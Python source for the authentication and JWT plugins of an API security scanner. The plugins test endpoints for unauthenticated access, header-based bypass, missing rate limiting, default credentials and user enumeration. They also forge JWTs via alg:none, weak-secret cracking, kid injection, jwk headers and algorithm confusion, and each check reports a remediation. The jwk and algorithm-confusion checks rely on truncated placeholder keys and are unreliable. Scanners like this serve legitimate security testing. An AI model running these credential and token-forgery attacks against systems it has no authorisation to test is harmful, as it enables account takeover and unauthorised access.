"""
modules/auth.py — Broken Authentication
modules/jwt.py  — JWT Attacks
OWASP API2:2023
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
from typing import Any, Dict, List, Optional, Tuple, cast

from core.plugins import BasePlugin
from core.models import Finding, ScanResult, CVSS_PROFILES
from payloads.database import AUTH, JWT_ATTACKS


# ═══════════════════════════════════════════════════════════════════
# AUTH PLUGIN
# ═══════════════════════════════════════════════════════════════════

class AuthPlugin(BasePlugin):
    NAME           = "auth"
    DESCRIPTION    = "Default creds, auth bypass headers, user enumeration, rate-limit on login"
    OWASP_CATEGORY = "API2:2023 - Broken Authentication"
    TAGS           = ["auth", "credentials", "brute-force", "rate-limit"]

    async def run(self, target: str, result: ScanResult) -> List[Finding]:
        self.log("Starting Authentication scan")
        findings: List[Finding] = []

        tasks = [
            self._test_unauthenticated(target, result),
            self._test_bypass_headers(target),
            self._test_rate_limit(target),
            self._test_default_creds(target),
            self._test_user_enumeration(target),
        ]
        all_results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in all_results:
            if isinstance(r, list):
                findings.extend(r)

        for f in findings:
            self.add(f)
            result.add_finding(f)

        self.log(f"Found {len(findings)} auth issues")
        return findings

    async def _test_unauthenticated(self, target: str, result: ScanResult) -> List[Finding]:
        """Checks if data-returning endpoints are accessible without auth."""
        findings: List[Finding] = []
        sensitive_keywords = ["/user", "/account", "/profile", "/admin",
                               "/dashboard", "/private", "/secure", "/internal"]

        candidate_urls = []
        disc = result.discovered_endpoints or []
        for i, url in enumerate(disc):
            if i >= 8: break
            if any(kw in str(url).lower() for kw in sensitive_keywords):
                candidate_urls.append(url)

        if not candidate_urls:
            candidate_urls = [
                target.rstrip("/") + p
                for p in ["/api/users", "/api/v1/users", "/users", "/me", "/profile"]
            ]

        # Request without Authorization header (even if engine has one set)
        import requests as _requests

        async def probe(url):
            resp = await self.engine.get(url, headers={"Authorization": ""})
            return url, resp

        results = await asyncio.gather(*[probe(u) for u in candidate_urls], return_exceptions=True)

        for item in results:
            if isinstance(item, Exception):
                continue
            # Use cast to satisfy pedantic linter on tuple unpacking from gather
            url, resp = cast(Tuple[str, Any], item)
            if resp and getattr(resp, "status", 0) == 200 and len(getattr(resp, "body", "")) > 80:
                looks_real = (resp.is_json or '"id"' in resp.body or
                              '"email"' in resp.body or '"username"' in resp.body)
                if looks_real:
                    f = Finding(
                        vuln_type       = "Unauthenticated Access to Protected Endpoint",
                        title           = "Protected Endpoint Accessible Without Authentication",
                        endpoint        = url,
                        method          = "GET",
                        payload         = "No Authorization header",
                        response_status = resp.status,
                        response_body   = resp.body[:500],
                        severity        = "HIGH",
                        cvss_score      = CVSS_PROFILES["BROKEN_AUTH"]["score"],
                        cvss_vector     = CVSS_PROFILES["BROKEN_AUTH"]["vector"],
                        owasp_category  = self.OWASP_CATEGORY,
                        description     = f"'{url}' returned HTTP 200 with data without any auth credentials. Sensitive data may be publicly accessible.",
                        recommendation  = (
                            "1. Apply authentication middleware globally (deny-by-default).\n"
                            "2. Explicitly whitelist public endpoints — everything else requires auth.\n"
                            "3. Use JWTs or server-side sessions validated on every request.\n"
                            "4. Return 401 for unauthenticated requests to protected resources."
                        ),
                        confirmed       = False,
                        confidence_score= 0.7,
                        module          = self.NAME,
                        tags            = ["auth", "unauthenticated"],
                    )
                    findings.append(f)
                    self.log(f"Unauthenticated: {url}", "FOUND")
        return findings

    async def _test_bypass_headers(self, target: str) -> List[Finding]:
        """Tests header-based auth bypass (X-Forwarded-For: 127.0.0.1, etc.)."""
        findings: List[Finding] = []
        test_url = target.rstrip("/") + "/api/admin"

        # Use safe iteration for AUTH["header_bypass"]
        tasks = [self.engine.get(test_url, headers=h) for h in AUTH["header_bypass"][:6]]
        resps = await asyncio.gather(*tasks, return_exceptions=True)

        # Use safe iteration for AUTH["header_bypass"]
        for i, (bypass_headers, resp) in enumerate(zip(AUTH["header_bypass"], resps)):
            if i >= 6: break # Ensure we only iterate up to 6 items
            if isinstance(resp, Exception) or not resp:
                continue
            if resp.status == 200 and len(resp.body) > 50:
                hdr_name = str(list(bypass_headers.keys())[0])
                confirmation_evidence = [f"Auth bypassed using spoofed header: {hdr_name}"]
                
                f = Finding(
                    vuln_type       = "Auth Bypass via Header",
                    title           = f"CRITICAL: Auth Bypass via '{hdr_name}'",
                    endpoint        = test_url,
                    method          = "GET",
                    parameter       = hdr_name,
                    payload         = str(bypass_headers),
                    response_status = resp.status,
                    severity        = "CRITICAL",
                    owasp_category  = self.OWASP_CATEGORY,
                    module          = self.NAME,
                    confirmation_evidence = confirmation_evidence,
                    tags            = ["auth", "bypass", "headers"]
                )
                f.calculate_confidence({"status_match": True, "boolean_based": True})
                
                f.description = f"Auth bypassed using '{hdr_name}'. Server trusts spoofable client headers for access control."
                f.recommendation = "Never use client-supplied headers (X-Forwarded-For, X-Real-IP) for access control. Use validated server-side tokens only."
                findings.append(f)
                self.log(f"Auth bypass via {hdr_name}", "FOUND")
                break
        return findings

    async def _test_rate_limit(self, target: str) -> List[Finding]:
        """Tests brute-force protection on login endpoints."""
        findings: List[Finding] = []

        # Use safe iteration for AUTH["login_paths"]
        for i, path in enumerate(AUTH["login_paths"]):
            if i >= 4: break # Ensure we only iterate up to 4 items
            url = target.rstrip("/") + path
            probe = await self.engine.post(url, json={"username": "test", "password": "test"})
            if not probe or probe.status not in (200, 400, 401, 422):
                continue

            # Fire 12 rapid requests
            old_delay = self.engine.base_delay
            self.engine.base_delay = 0.02
            resps = await asyncio.gather(
                *[self.engine.post(url, json={"username": "admin", "password": f"wrong{i}"})
                  for i in range(12)],
                return_exceptions=True
            )
            self.engine.base_delay = old_delay
 
            # Use getattr/cast to avoid 'BaseException has no status' lint
            codes = []
            for r in resps:
                if not isinstance(r, Exception) and r:
                    codes.append(int(cast(Any, r).status))
            
            if len(codes) >= 9 and 429 not in codes:
                f = Finding(
                    vuln_type       = "No Rate Limiting on Login Endpoint",
                    title           = "Login Endpoint Vulnerable to Brute-Force Attacks",
                    endpoint        = url,
                    method          = "POST",
                    payload         = "12 rapid POST requests, no 429 triggered",
                    response_body   = f"Response codes: {set(codes)}",
                    severity        = "HIGH",
                    cvss_score      = CVSS_PROFILES["RATE_LIMIT"]["score"],
                    cvss_vector     = CVSS_PROFILES["RATE_LIMIT"]["vector"],
                    owasp_category  = self.OWASP_CATEGORY,
                    description     = f"Login endpoint '{path}' accepts unlimited rapid auth attempts — vulnerable to credential stuffing and brute-force.",
                    recommendation  = "Implement per-IP and per-account rate limiting (max 5/min).",
                    confirmed       = True,
                    confidence_score= 0.95,
                    module          = self.NAME,
                    tags            = ["auth", "rate-limit", "brute-force"],
                )
                findings.append(f)
                self.log(f"No rate limit on {path}", "FOUND")
                break
        return findings

    async def _test_default_creds(self, target: str) -> List[Finding]:
        """Tests default credential pairs on login endpoints."""
        findings: List[Finding] = []

        for path in AUTH["login_paths"][:3]:
            url = target.rstrip("/") + path
            creds = AUTH["default_credentials"][:10]

            resps = await asyncio.gather(
                *[self.engine.post(url, json={"username": u, "password": p})
                  for u, p in creds],
                return_exceptions=True
            )

            success_kw = ["token", "access_token", "jwt", "session",
                          '"id":', '"success":true', '"authenticated":true']

            for (username, password), resp in zip(creds, resps):
                if isinstance(resp, Exception) or not resp:
                    continue
                if resp.status == 200 and any(kw in resp.body.lower() for kw in success_kw):
                    # Ground-truth confirmation: Try to use the token if found
                    token_match = re.search(r'["\'](?:token|access_token|jwt)["\']\s*:\s*["\']([^"\']+)["\']', resp.body)
                    conf = 0.9
                    if token_match:
                        token = token_match.group(1)
                        # Minimal sanity check on /me or similar
                        check = await self.engine.get(target.rstrip("/") + "/me", headers={"Authorization": f"Bearer {token}"})
                        if check and check.status == 200:
                            conf = 1.0

                    f = Finding(
                        vuln_type       = "Default Credentials Accepted",
                        title           = f"Default Creds Work: {username}/{password}",
                        endpoint        = url,
                        method          = "POST",
                        payload         = f'{{"username":"{username}","password":"{password}"}}',
                        response_status = resp.status,
                        severity        = "CRITICAL",
                        cvss_score      = CVSS_PROFILES["DEFAULT_CREDS"]["score"],
                        owasp_category  = self.OWASP_CATEGORY,
                        description     = f"Default credential pair '{username}/{password}' was accepted by the API.",
                        recommendation  = "Remove default credentials. Force password change.",
                        confirmed       = (conf == 1.0),
                        confidence_score= conf,
                        module          = self.NAME,
                        tags            = ["auth", "default-creds", "critical"],
                    )
                    findings.append(f)
                    self.log(f"DEFAULT CREDS: {username}/{password} (Conf: {conf})", "FOUND")
                    break
        return findings

    async def _test_user_enumeration(self, target: str) -> List[Finding]:
        """Detects if login error messages reveal whether a username exists."""
        findings: List[Finding] = []

        enum_keywords = ["user not found", "no such user", "invalid username",
                         "email not registered", "account does not exist",
                         "username is incorrect", "no account found"]

        for path in AUTH["login_paths"][:3]:
            url = target.rstrip("/") + path
            resp = await self.engine.post(url, json={"username": "test_nonexistent_xyz123", "password": "wrong"})
            if resp and any(kw in resp.body.lower() for kw in enum_keywords):
                f = Finding(
                    vuln_type       = "User Enumeration via Login Response",
                    title           = "Login Endpoint Leaks Valid Usernames",
                    endpoint        = url,
                    method          = "POST",
                    payload         = '{"username": "nonexistent_user"}',
                    response_status = resp.status,
                    response_body   = resp.body[:400],
                    severity        = "MEDIUM",
                    cvss_score      = 5.3,
                    cvss_vector     = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    owasp_category  = self.OWASP_CATEGORY,
                    description     = f"The login endpoint returns different error messages based on whether the username exists, enabling username enumeration before targeted attacks.",
                    recommendation  = "Always return a generic message: 'Invalid credentials'. Never reveal which field is incorrect.",
                    confirmed       = True,
                    confidence_score= 0.85,
                    module          = self.NAME,
                    tags            = ["auth", "enumeration"],
                )
                findings.append(f)
                self.log(f"User enumeration: {url}", "FOUND")
                break
        return findings


# ═══════════════════════════════════════════════════════════════════
# JWT PLUGIN
# ═══════════════════════════════════════════════════════════════════

class JWTPlugin(BasePlugin):
    NAME           = "jwt"
    DESCRIPTION    = "JWT attacks: alg:none, algorithm confusion, kid injection, weak secrets, JWKS/JWK manipulation"
    OWASP_CATEGORY = "API2:2023 - Broken Authentication"
    TAGS           = ["jwt", "auth", "token", "cryptography"]

    _JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    _FOUND_KEYS: List[str] = [] # Stores public keys found during scan

    async def run(self, target: str, result: ScanResult) -> List[Finding]:
        self.log("Starting JWT scan")
        findings: List[Finding] = []

        # Try to extract a JWT from previous scan responses
        token = self._extract_jwt(result)

        tasks = [self._test_jwks_exposed(target)]
        if token:
            short_token: str = str(cast(Any, token)[0:40])
            self.log(f"JWT found: {short_token}…")
            tasks.extend([
                self._test_none_alg(target, token),
                self._test_weak_secret(target, token),
                self._test_no_expiry(token, target),
                self._test_kid_injection(target, token),
                self._test_jwk_header(target, token),
                self._test_algo_confusion(target, token),
            ])
        else:
            tasks.append(self._test_jwt_issuance(target))

        all_results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in all_results:
            if isinstance(r, list):
                findings.extend(r)

        for f in findings:
            self.add(f)
            result.add_finding(f)

        self.log(f"Found {len(findings)} JWT issues")
        return findings

    def _extract_jwt(self, result: ScanResult) -> Optional[str]:
        for f in result.findings:
            m = self._JWT_RE.search(f.response_body)
            if m:
                return m.group(0)
        return None

    def _decode_payload(self, token: str) -> Optional[dict]:
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            return json.loads(base64.urlsafe_b64decode(padded))
        except Exception:
            return None

    def _forge_jwt(self, payload: dict, alg: str = "none", secret: str = "", header_ext: Optional[dict] = None) -> str:
        h = {"alg": alg, "typ": "JWT"}
        if header_ext:
            h.update(header_ext)
            
        header = base64.urlsafe_b64encode(
            json.dumps(h).encode()
        ).rstrip(b"=").decode()
        body = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()
        unsigned = f"{header}.{body}"

        if alg.lower() == "none":
            return f"{unsigned}."
        if alg == "HS256":
            sig = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
            return unsigned + "." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{unsigned}."

    async def _test_none_alg(self, target: str, token: str) -> List[Finding]:
        findings: List[Finding] = []
        payload = self._decode_payload(token) or {}
        for field in ["role", "is_admin", "admin", "scope"]:
            if field in payload:
                payload[field] = "admin" if isinstance(payload.get(field), str) else True

        test_url = target.rstrip("/") + "/api/v1/users"
        tasks, variants = [], []

        for alg_variant in JWT_ATTACKS["none_alg_variants"]:
            forged = self._forge_jwt(payload, alg_variant)
            variants.append((alg_variant, forged))
            tasks.append(self.engine.get(test_url, headers={"Authorization": f"Bearer {forged}"}))

        resps = await asyncio.gather(*tasks, return_exceptions=True)

        for (alg_variant, forged), resp in zip(variants, resps):
            if isinstance(resp, Exception) or not resp:
                continue
            if resp.status == 200 and len(resp.body) > 50:
                confirmation_evidence = [f"JWT accepted with alg: '{alg_variant}' (signature bypassed)", 
                                         f"Response status 200 returned for forged token"]
                f = Finding(
                    vuln_type       = "JWT Algorithm Confusion (alg:none)",
                    title           = f"CRITICAL: JWT 'none' Algorithm accepted",
                    endpoint        = target,
                    method          = "GET",
                    payload         = f"Forged JWT alg={alg_variant}: {str(cast(Any, forged)[0:60])}…",
                    response_status = resp.status,
                    severity        = "CRITICAL",
                    owasp_category  = self.OWASP_CATEGORY,
                    module          = self.NAME,
                    confirmation_evidence = confirmation_evidence,
                    tags            = ["jwt", "none-alg", "critical"]
                )
                f.calculate_confidence({"status_match": True, "boolean_based": True})
                
                f.description = f"Server accepted a JWT with alg='{alg_variant}' and no valid signature. This allows full authentication bypass."
                f.recommendation = "Explicitly allowlist permitted algorithms (e.g., ['HS256', 'RS256']). Never accept 'none'."
                findings.append(f)
                self.log(f"JWT none alg CONFIRMED: alg={alg_variant}", "FOUND")
                break
        return findings

    async def _test_weak_secret(self, target: str, token: str) -> List[Finding]:
        findings: List[Finding] = []
        parts = token.split(".")
        if len(parts) != 3:
            return findings
        try:
            sig_bytes = base64.urlsafe_b64decode(parts[2] + "==")
        except Exception:
            return findings

        unsigned = f"{parts[0]}.{parts[1]}"
        for secret in JWT_ATTACKS["weak_secrets"]:
            expected = hmac.new(secret.encode(), unsigned.encode(), hashlib.sha256).digest()
            if expected == sig_bytes:
                f = Finding(
                    vuln_type       = "JWT Weak Signing Secret",
                    title           = f"JWT Secret Cracked: '{secret}'",
                    endpoint        = target,
                    method          = "N/A",
                    payload         = f"Secret: '{secret}'",
                    response_body   = f"JWT signed with trivial HS256 secret '{secret}'",
                    severity        = "CRITICAL",
                    cvss_score      = CVSS_PROFILES["JWT_WEAK_SECRET"]["score"],
                    cvss_vector     = CVSS_PROFILES["JWT_WEAK_SECRET"]["vector"],
                    owasp_category  = self.OWASP_CATEGORY,
                    description     = f"JWT uses weak secret '{secret}'. An attacker knowing this secret can forge any token with arbitrary claims.",
                    recommendation  = (
                        "1. Use a cryptographically random secret of ≥256 bits.\n"
                        "2. Store in a secrets manager (AWS SM, HashiCorp Vault).\n"
                        "3. Rotate the key immediately and invalidate all existing tokens.\n"
                        "4. Consider switching to RS256 (asymmetric) to separate sign/verify."
                    ),
                    confirmed       = True,
                    confidence_score= 1.0,
                    module          = self.NAME,
                    tags            = ["jwt", "weak-secret"],
                )
                findings.append(f)
                self.log(f"JWT SECRET CRACKED: '{secret}'", "FOUND")
                break
        return findings

    async def _test_no_expiry(self, token: str, target: str) -> List[Finding]:
        payload = self._decode_payload(token) or {}
        if "exp" not in payload:
            payload_str: str = str(cast(Any, json.dumps(payload))[0:300])
            return [Finding(
                vuln_type       = "JWT Without Expiration",
                title           = "Issued JWT Has No Expiration Claim",
                endpoint        = target,
                method          = "N/A",
                payload         = "Token missing 'exp' claim",
                response_body   = f"Payload: {payload_str}",
                severity        = "MEDIUM",
                cvss_score      = CVSS_PROFILES["JWT_NO_EXP"]["score"],
                cvss_vector     = CVSS_PROFILES["JWT_NO_EXP"]["vector"],
                owasp_category  = self.OWASP_CATEGORY,
                description     = "JWT has no 'exp' claim — stolen tokens are valid forever.",
                recommendation  = "Set short 'exp' (15–60 min). Use refresh tokens for long sessions.",
                confirmed       = True,
                module          = self.NAME,
                tags            = ["jwt", "expiry"],
            )]
        return []

    async def _test_jwks_exposed(self, target: str) -> List[Finding]:
        findings: List[Finding] = []
        paths = JWT_ATTACKS["jwks_paths"]
        resps = await asyncio.gather(
            *[self.engine.get(target.rstrip("/") + p) for p in paths],
            return_exceptions=True
        )
        for path, resp in zip(paths, resps):
            if isinstance(resp, Exception) or not resp:
                continue
            if resp.status == 200 and '"keys"' in resp.body:
                f = Finding(
                    vuln_type       = "JWKS Endpoint Exposed",
                    title           = "Public JWKS Endpoint Accessible",
                    endpoint        = target.rstrip("/") + path,
                    method          = "GET",
                    payload         = "",
                    response_status = resp.status,
                    response_body   = resp.body[:400],
                    severity        = "INFO",
                    cvss_score      = 0.0,
                    owasp_category  = self.OWASP_CATEGORY,
                    description     = f"JWKS endpoint at '{path}' is accessible. Ensure RS256→HS256 algorithm confusion is not possible.",
                    recommendation  = "Ensure JWT library enforces specific allowed algorithms. Never accept RS256 tokens verified with HS256 using the RSA public key as HMAC secret.",
                    module          = self.NAME,
                    tags            = ["jwt", "jwks"],
                )
                findings.append(f)
                self.log(f"JWKS exposed: {path}", "FOUND")
                break
        return findings

    async def _test_jwt_issuance(self, target: str) -> List[Finding]:
        """Tests if token-issuing endpoints have security issues."""
        findings: List[Finding] = []
        for path in AUTH["login_paths"][:3]:
            url = target.rstrip("/") + path
            resp = await self.engine.post(url, json={"username": "test", "password": "test"})
            if resp and resp.status == 200:
                m = self._JWT_RE.search(resp.body)
                if m:
                    payload = self._decode_payload(m.group(0))
                    if payload and "exp" not in payload:
                        more = await self._test_no_expiry(m.group(0), url)
                        findings.extend(more)
        return findings
    async def _test_kid_injection(self, target: str, token: str) -> List[Finding]:
        findings: List[Finding] = []
        payload = self._decode_payload(token) or {"user": "admin"}
        test_url = target.rstrip("/") + "/api/v1/users"
        
        tasks, kids = [], []
        for kid in JWT_ATTACKS["kid_payloads"]:
            forged = self._forge_jwt(payload, alg="HS256", secret="", header_ext={"kid": kid})
            kids.append(kid)
            tasks.append(self.engine.get(test_url, headers={"Authorization": f"Bearer {forged}"}))
            
        resps = await asyncio.gather(*tasks, return_exceptions=True)
        for kid, resp in zip(kids, resps):
            if not isinstance(resp, Exception) and resp and resp.status == 200:
                f = Finding(
                    vuln_type="JWT 'kid' Injection",
                    title=f"Potential JWT Bypass via 'kid' manipulation",
                    endpoint=test_url, method="GET", payload=f"kid: {kid}",
                    severity="HIGH", confirmed=False,
                    owasp_category=self.OWASP_CATEGORY, module=self.NAME,
                    confirmation_evidence=[f"Server accepted JWT with a forged 'kid' value: {kid}"]
                )
                f.calculate_confidence({"status_match": True, "boolean_based": True})
                f.description = f"The server accepted a token with a manipulated 'kid' (Key ID) header. This often occurs when the backend uses the 'kid' to fetch the secret from a predictable location (e.g. /dev/null or a file) or via SQLi."
                findings.append(f)
        return findings

    async def _test_jwk_header(self, target: str, token: str) -> List[Finding]:
        findings: List[Finding] = []
        payload = self._decode_payload(token) or {"user": "admin"}
        test_url = target.rstrip("/") + "/api/v1/users"
        
        # Injecting a self-signed key in 'jwk' header
        fake_jwk = {
            "kty": "RSA", "e": "AQAB", "use": "sig", "alg": "RS256",
            "n": "m7... (simplified fake key)"
        }
        forged = self._forge_jwt(payload, alg="RS256", header_ext={"jwk": fake_jwk})
        
        resp = await self.engine.get(test_url, headers={"Authorization": f"Bearer {forged}"})
        if not isinstance(resp, Exception) and resp and resp.status == 200:
            f = Finding(
                vuln_type="JWT 'jwk' Header Injection",
                title="Unauthorized JWT Verification via 'jwk' Header",
                endpoint=test_url, method="GET", severity="CRITICAL",
                owasp_category=self.OWASP_CATEGORY, module=self.NAME,
                confirmation_evidence=["Server accepted a token using the embedded 'jwk' public key for verification."]
            )
            f.calculate_confidence({"status_match": True, "boolean_based": True})
            findings.append(f)
        return findings

    async def _test_algo_confusion(self, target: str, token: str) -> List[Finding]:
        findings: List[Finding] = []
        payload = self._decode_payload(token) or {}
        test_url = target.rstrip("/") + "/api/v1/users"
        
        # We need a public key. If none found, we use a common RSA public key placeholder
        # In a real scenario, we would extract this from a JWKS endpoint or a certificate
        keys_to_try = list(self._FOUND_KEYS)
        if not keys_to_try:
            # Common placeholder for testing
            keys_to_try.append("-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA... (simplified)\n-----END PUBLIC KEY-----")
        
        tasks, tried = [], []
        for pubkey in keys_to_try:
            # Alg Confusion: Sign with Public Key as if it were an HMAC secret
            forged = self._forge_jwt(payload, alg="HS256", secret=pubkey)
            tried.append(pubkey)
            tasks.append(self.engine.get(test_url, headers={"Authorization": f"Bearer {forged}"}))
            
        resps = await asyncio.gather(*tasks, return_exceptions=True)
        for pubkey, resp in zip(tried, resps):
            if not isinstance(resp, Exception) and resp and resp.status == 200:
                f = Finding(
                    vuln_type="JWT Algorithm Confusion",
                    title="RS256 to HS256 Confusion Detected",
                    endpoint=test_url, method="GET", severity="CRITICAL",
                    owasp_category=self.OWASP_CATEGORY, module=self.NAME,
                    confirmation_evidence=["Server accepted an RS256 token signed with HS256 using its public key."]
                )
                f.calculate_confidence({"status_match": True, "boolean_based": True})
                findings.append(f)
        return findings
